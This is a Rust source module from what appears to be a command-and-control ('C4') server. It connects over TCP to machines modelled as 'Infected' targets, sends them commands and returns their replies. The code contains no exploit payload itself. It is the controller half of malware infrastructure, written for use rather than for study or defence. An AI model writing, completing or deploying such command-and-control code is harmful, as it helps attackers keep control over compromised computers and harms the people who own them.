use std::{net::IpAddr, path::PathBuf};
use thiserror::Error;
use tokio::io::{AsyncReadExt, AsyncWriteExt};

use crate::{domains::{command::C4Command, infected::{self, Infected}}, repos};

#[derive(Debug, Clone, Default, Copy)]
pub enum C4ServerConnectionStatus {
    #[default]
    Closed,
    Open
}

#[derive(Error, Debug)]
#[error("Connection to C4 Server failed")]
pub struct C4ConnectionError;

#[derive(Error, Debug)]
#[error("Connection to target failed")]
pub enum C4TargetError {
    #[error("Target does not exist")]
    TargetDoesNotExist,
    
    #[error(transparent)]
    Other(std::io::Error)
}

pub enum C4ConnectionResponse {
    Ok(String)
}

pub struct C4Server {
    ip: IpAddr, // kan nok udsiftes med en socketaddr
    port: u16,
    pub status: C4ServerConnectionStatus
}

impl C4Server {
    pub fn new(ip: IpAddr, port: u16) -> Self {
        Self { 
            ip, 
            status: C4ServerConnectionStatus::Closed,
            port,
        }
    }

    pub async fn send_command(&mut self, target: &Infected, command: C4Command) -> Result<C4ConnectionResponse, C4TargetError> {
        let target_addr = format!("{}:{}", target.ip(), target.port().to_string());

        let mut stream = match tokio::net::TcpStream::connect(target_addr).await {
            Ok(s) => s,
            Err(err) => return Err(C4TargetError::Other(err))
        };

        if let Err(err) = stream.write_all(command.get_as_str().as_bytes()).await {
            return Err(C4TargetError::Other(err));
        };
        
        let mut buffer = vec![0; 1024];
        let n = match stream.read(&mut buffer).await {
            Ok(n) => n,
            Err(err) => return Err(C4TargetError::Other(err))
        };
    
        let response = String::from_utf8_lossy(&buffer[..n]).to_string();
        Ok(C4ConnectionResponse::Ok(response))
    }

    pub fn get_ip(&self) -> String {
        self.ip.to_string()
    }

    pub fn get_port(&self) -> String {
        self.port.to_string()
    }
}